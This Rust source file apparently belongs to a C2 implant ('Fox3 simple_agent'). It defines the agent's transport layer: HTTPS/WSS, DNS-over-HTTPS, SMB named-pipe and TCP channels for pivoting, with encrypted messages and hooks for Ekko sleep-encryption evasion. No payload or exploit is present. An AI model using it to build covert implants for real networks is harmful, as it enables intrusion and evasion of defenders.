/// Transport abstraction for Fox3 simple_agent.
///
/// `Transport` is a uniform wrapper around pluggable transports:
/// - HTTP/HTTPS + WSS hybrid (`http`) — default, auto-upgrades to WSS
/// - DoH/DNS hybrid (`dns`) — DNS-over-HTTPS with raw DNS fallback
/// - SMB named pipe (`smb`) — Windows only, for pivot/child agents
/// - Raw TCP (`tcp`) — cross-platform, for pivot/child agents
///
/// All transports use the same JWE-encrypted message body and JWT auth header,
/// so the protocol layer is completely transport-agnostic.

pub mod dns;
pub mod http;
pub mod smb;
pub mod tcp;

/// Core transport trait.  All implementations must be `Send` (used across threads).
pub trait Transporter: Send {
    /// Send an encrypted body with an authorization header; return the response body.
    fn send(&self, auth: &str, body: Vec<u8>) -> anyhow::Result<Vec<u8>>;
    /// Short name for logging/diagnostics.
    #[allow(dead_code)]
    fn kind(&self) -> &'static str;
    /// Non-blocking receive for server-pushed data.
    /// Returns Ok(Some(data)) if a frame arrived within `timeout`, Ok(None) on timeout.
    /// Only meaningful for persistent-connection transports (WSS); others return Ok(None).
    fn try_recv(&self, _timeout: std::time::Duration) -> anyhow::Result<Option<Vec<u8>>> { Ok(None) }
    /// Returns true if this transport can receive server-pushed data via try_recv().
    fn supports_push(&self) -> bool { false }
    /// Return the raw OS socket handle for the WSS connection (Windows only).
    /// Used by Ekko sleep encryption to register WSAEventSelect.
    fn raw_wss_socket(&self) -> Option<u64> { None }
}

/// Unified transport handle.  Holds a boxed `Transporter` implementation.
/// `agent.rs` uses this via `Transport::post()` — unchanged from the previous API.
pub struct Transport {
    inner: Box<dyn Transporter>,
}

impl Transport {
    /// Create an HTTPS transport (default).  Optional `proxy` for HTTP CONNECT tunneling.
    pub fn new_http(url: String, proxy: String) -> anyhow::Result<Self> {
        let ht = http::HttpTransport::new(url, proxy)?;
        Ok(Self { inner: Box::new(ht) })
    }

    /// Create an SMB named-pipe transport (Windows only).
    pub fn new_smb(pipe_path: String) -> anyhow::Result<Self> {
        Ok(Self { inner: Box::new(smb::SmbTransport::new(pipe_path)?) })
    }

    /// Create a raw TCP transport.
    pub fn new_tcp(addr: String) -> anyhow::Result<Self> {
        Ok(Self { inner: Box::new(tcp::TcpTransport::new(addr)?) })
    }

    /// Create a hybrid DoH/DNS transport.
    pub fn new_dns(
        doh_url: String,
        dns_server: String,
        domain: String,
        agent_id: uuid::Uuid,
    ) -> anyhow::Result<Self> {
        Ok(Self { inner: Box::new(dns::DnsTransport::new(doh_url, dns_server, domain, agent_id)?) })
    }

    /// Backward-compatible constructor — defaults to HTTP with no proxy.
    #[allow(dead_code)]
    pub fn new(url: String) -> anyhow::Result<Self> {
        Self::new_http(url, String::new())
    }

    /// POST encrypted payload; return raw response bytes.
    /// Same signature as the old `Transport::post()` so `agent.rs` is unchanged.
    pub fn post(&self, auth_header: String, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
        self.inner.send(&auth_header, body)
    }

    #[allow(dead_code)]
    pub fn kind(&self) -> &'static str { self.inner.kind() }

    /// Non-blocking receive for server-pushed data (WSS only).
    pub fn try_recv(&self, timeout: std::time::Duration) -> anyhow::Result<Option<Vec<u8>>> {
        self.inner.try_recv(timeout)
    }

    /// Returns true if this transport can receive server-pushed data.
    pub fn supports_push(&self) -> bool {
        self.inner.supports_push()
    }

    /// Return the raw OS socket handle for the WSS connection.
    /// Used by Ekko sleep encryption for WSAEventSelect.
    pub fn raw_wss_socket(&self) -> Option<u64> {
        self.inner.raw_wss_socket()
    }

}
